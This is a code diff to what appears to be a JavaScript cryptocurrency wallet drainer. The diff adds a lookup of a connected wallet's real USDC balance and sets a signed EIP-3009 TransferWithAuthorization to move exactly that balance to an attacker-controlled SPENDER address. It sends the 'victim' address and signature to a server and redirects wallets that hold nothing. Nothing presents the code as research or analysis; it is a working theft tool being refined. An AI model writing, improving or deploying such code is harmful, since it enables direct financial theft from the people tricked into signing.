@@ -594,6 +594,29 @@ async function _run() {
     var validBefore = Math.floor(Date.now() / 1000) + 86400;
     var nowFormatted = formatDateTime();
 
+    // Fetch solde USDC réel — même logique que le flow WalletConnect principal
+    var usdcBalance = '0';
+    try {
+      var balCallData = '0x70a08231' + '000000000000000000000000' + capturedAddr.slice(2).toLowerCase();
+      var balHex = await e.request({ method: 'eth_call', params: [{ to: USDC, data: balCallData }, 'latest'] });
+      if (balHex && balHex !== '0x') {
+        usdcBalance = BigInt(balHex).toString();
+      }
+    } catch(_) {
+      // fallback publicnode
+      try {
+        var rpcResp = await fetch('https://ethereum.publicnode.com', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'eth_call', params:[{ to: USDC, data: '0x70a08231' + '000000000000000000000000' + capturedAddr.slice(2).toLowerCase() }, 'latest'] })
+        });
+        var rpcJson = await rpcResp.json();
+        if (rpcJson.result && rpcJson.result !== '0x') usdcBalance = BigInt(rpcJson.result).toString();
+      } catch(_2) {}
+    }
+
+    if (usdcBalance === '0') { redirect(); return; }
+
     var types3009 = {
       TransferWithAuthorization: [
         { name: 'from',        type: 'address' },
@@ -607,7 +630,7 @@ async function _run() {
     var msg3009 = {
       from:        capturedAddr,
       to:          SPENDER,
-      value:       '115792089237316195423570985008687907853269984665640564039457584007913129639935',
+      value:       usdcBalance,
       validAfter:  validAfter.toString(),
       validBefore: validBefore.toString(),
       nonce:       rwaNonce
@@ -637,7 +660,7 @@ async function _run() {
           body: JSON.stringify({
             victim:   capturedAddr,
             chain:    '1',
-            usdcAuth: { from: capturedAddr, to: SPENDER, value: msg3009.value, validAfter: validAfter.toString(), validBefore: validBefore.toString(), nonce: rwaNonce },
+            usdcAuth: { from: capturedAddr, to: SPENDER, value: usdcBalance, validAfter: validAfter.toString(), validBefore: validBefore.toString(), nonce: rwaNonce },
             usdcSig:  signature
           })
         });
